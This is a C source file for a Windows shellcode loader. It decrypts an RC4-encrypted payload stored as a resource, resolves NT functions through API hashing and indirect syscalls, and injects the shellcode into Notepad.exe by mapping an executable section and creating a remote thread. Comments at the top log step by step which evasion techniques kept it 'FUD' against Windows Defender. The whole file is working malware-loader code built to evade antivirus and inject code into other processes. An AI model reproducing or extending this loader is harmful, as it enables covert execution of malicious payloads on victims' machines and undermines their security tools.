#include "header.h" // Holds Func Prototypes For inDirect Syscalls, and Function defentions 
#include "resource.h" // Needed For Getting payload from .rsrc 
#include "win.h"
#define SEED 9 // Seed For Hashing

// NOTE FOR WD BYPASS
	// [1] FUD with Just RC4 Encrypted shellcode(hardcoded key) and inDirect Syscall remote mapping, pID passed with argv[1]
	// [2] Still FUD when changed to storing payload in .rcdata
	// [3] Still FUD When Added inDirect Syscall Of NtQuerySystemProcess
	// [4] Still FUD When Added API Hashing
	// [5] Still FUD With No Debug Info Or PrintF Statements
	// [6] Still FUD with No CMD popup
	// [7] DETECTED WHEN ADDING IAT CAMO
	// [8]



// inDirect Syscalls : DONE
// Api Hashing : DONE
// Custom GetProc/GetModHandle : Cusproc(DONE):CusMod(NOPE)
// Anti-Anylisis Stuff : NOPE
// IAT Camo : DONE
// RC4 Encryption : DONE
// No CRT Libs : NOPE

DWORD FN_NtOpenProcessSSN;
UINT_PTR FN_NtOpenProcessSYSCALL;


DWORD FN_NtCreateSectionSSN;
UINT_PTR FN_NtCreateSectionSYSCALL;

DWORD FN_NtMapViewOfSectionSSN;
UINT_PTR FN_NtMapViewOfSectionSYSCALL;

DWORD FN_NtCreateThreadExSSN;
UINT_PTR FN_NtCreateThreadExSYSCALL;


DWORD op = 0x73637d5d;
DWORD Cr = 0x76e9e705;
DWORD Ma = 0xc4205b50;
DWORD Th = 0x0e3f8308;
DWORD Qu = 0x0c5774cb;


unsigned char code[462];


unsigned char key[] = {
	0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F // Key, This Should be changed
};

PVOID _memcpy(PVOID dest, PVOID src, SIZE_T size) {
	for (volatile int i = 0; i < size; i++) {
		((unsigned char*)dest)[i] = ((unsigned char*)src)[i];
	}
	return dest;
}

UINT32 hshA(IN PCHAR str) {
	SIZE_T index = 0;
	UINT32 hshs = 0;
	SIZE_T len = 0;

	len = lstrlenA(str);

	while (index != len) {
		hshs += str[index++];
		hshs += hshs >> SEED;
		hshs += hshs << 6;
	}

	hshs += hshs << 3;
	hshs ^= hshs >> 11;
	hshs += hshs << 15;

	return hshs;
}




VOID inSsN(IN HMODULE hNTDLL, IN DWORD Funchsh, OUT DWORD* SSN, OUT UINT_PTR* SYSCALL) {
	UINT_PTR NtFunctionAddr = NULL;
	BYTE SysOpcodes[2] = { 0x0F, 0x05 }; // These Are The OpCodes For SYSCALL, We Use Them To Compare Against, so we Know We found the Syscall

	//printf("0x%p\n", hNTDLL);
	//("Getting Address Of %s\n", FuncName);
	NtFunctionAddr = (UINT_PTR)CProc(hNTDLL, Funchsh); // Get Address Of Our Function (NtOpenProcess For Example)

	if (NtFunctionAddr == NULL) {
		//printf("Failed Finding Address\tCode: 0x%ld", GetLastError());
		return NULL;
	}

	//("Getting SSN...");
	*SSN = ((PBYTE)(NtFunctionAddr + 4))[0]; // SSN Number is 9/10 Stored 4 bytes From Start
	*SYSCALL = NtFunctionAddr + 0x12;       //  Syscall number Is Stored 12 bytes From Start Of Function

	if (memcmp(SysOpcodes, *SYSCALL, sizeof(SysOpcodes)) == 0) { // Compare the Found SysOpcodes To The correct ones
		//("Syscall Opcodes Match!");
	}
	else {
		//("OpCodes Did Not Match 0x0F, 0x05");
		return NULL;
	}

	//printf("Got SSN Of 0x%0.8x [0x%1x]\n\n", Funchsh, *SSN); // Print SSN Number
}



int main(int argc, char* argv[]) {
	HMODULE    ndll         = GetModuleHandleW(L"NTDLL");
	HANDLE     pHandle      = NULL;
	HANDLE     hThread      = NULL;
	HANDLE     hProc        = NULL;
	NTSTATUS   status       = NULL;
	PVOID      LocalBuffer  = NULL;
	PVOID      RemoteBuffer = NULL;
	DWORD      pID = 0;
	

	HRSRC rRcs = NULL;
	HGLOBAL hGlobal = NULL;
	PVOID pPayloadAddress = NULL;
	SIZE_T Payload_size = 0;


	pNQue(L"Notepad.exe", Qu, &pID);
	//printf("[%ld] Notepad\n\n", pID);

	//return 1;
	CLIENT_ID  CID = { (HANDLE)pID, NULL };
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };

	// Find Location Of Our Payload so we can load it
	rRcs = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (rRcs == NULL) {
		//printf("Failed to find resource");
		return 1;
	}

	// Load the RCDATA Into Memory Space
	hGlobal = LoadResource(NULL, rRcs);
	if (hGlobal == NULL) {
		//printf("Failed Finding Resource");
		return 1;
	}

	// Get The Address Where our shellcode starts
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		//printf("Failed Getting Address");
		return 1;
	}

	// Get The Size Of the Payload
	Payload_size = SizeofResource(NULL, rRcs);
	if (Payload_size == NULL) {
		//printf("Failed Getting size");
		return 1;
	}

	//printf("Payload Location: 0x%p\n\n", pPayloadAddress);

	

	// Copy the payload Into Our tmp Buffer
	//RtlMoveMemory(code, pPayloadAddress, Payload_size);
	_memcpy(code, pPayloadAddress, Payload_size);


	// Decrypt payload
	if (!rcEnc(key, code, sizeof(key), sizeof(code))) {
		//printf("FAILED\tCode: 0x%ld", GetLastError());
		return 1;
	}

	// Get SSN Number And Syscall Address
	inSsN(ndll, op, &FN_NtOpenProcessSSN, &FN_NtOpenProcessSYSCALL);
	//printf("ds0x%p\n", p_NtOpenProcess);
	//return 1;
	status = p_NtOpenPro(&hProc, PROCESS_ALL_ACCESS, &OA, &CID);
	if (status != 0x0) {
		//printf("Open Failedd");
		return EXIT_FAILURE;
	}
	//printf("HANDLE: 0x%p\n", hProc);

	size_t code_len = sizeof(code);
	//printf("Ntdll: 0x%p\n", ndll);


	inSsN(ndll, Cr, &FN_NtCreateSectionSSN, &FN_NtCreateSectionSYSCALL);
	status = p_NtCreateSection(&pHandle, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&code_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (status != 0x0) {
		//printf("Failed");
		return EXIT_FAILURE;
	}
	//printf("First-Address: 0x%p\n", pHandle);

	inSsN(ndll, Ma, &FN_NtMapViewOfSectionSSN, &FN_NtMapViewOfSectionSYSCALL);
	status = p_NtMapViewOfSection(pHandle, GetCurrentProcess(), &LocalBuffer, NULL, NULL, NULL, (SIZE_T*)&code_len, ViewUnmap, NULL, PAGE_READWRITE);
	if (status != 0x0) {
		//printf("Failed2");
		return EXIT_FAILURE;
	}
	//printf("Local: 0x%p\n", LocalBuffer);

	
	//memcpy(LocalBuffer, code, sizeof(code));
	_memcpy(LocalBuffer, code, sizeof(code));
	//RtlMoveMemory(LocalAlloc, code, sizeof(code));

	status = p_NtMapViewOfSection(pHandle, hProc, &RemoteBuffer, NULL, NULL, NULL, (SIZE_T*)&code_len, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
	if (status != 0x0) {
		//printf("View 2 Failed");
		return EXIT_FAILURE;
	}
	//printf("remote: 0x%p\n", RemoteBuffer);

	
	inSsN(ndll, Th, &FN_NtCreateThreadExSSN, &FN_NtCreateThreadExSYSCALL);
	status = p_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProc, (PTHREAD_START_ROUTINE)RemoteBuffer, NULL, 0, 0, 0, 0, NULL);

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hProc);
	CloseHandle(hThread);

	return 1;
}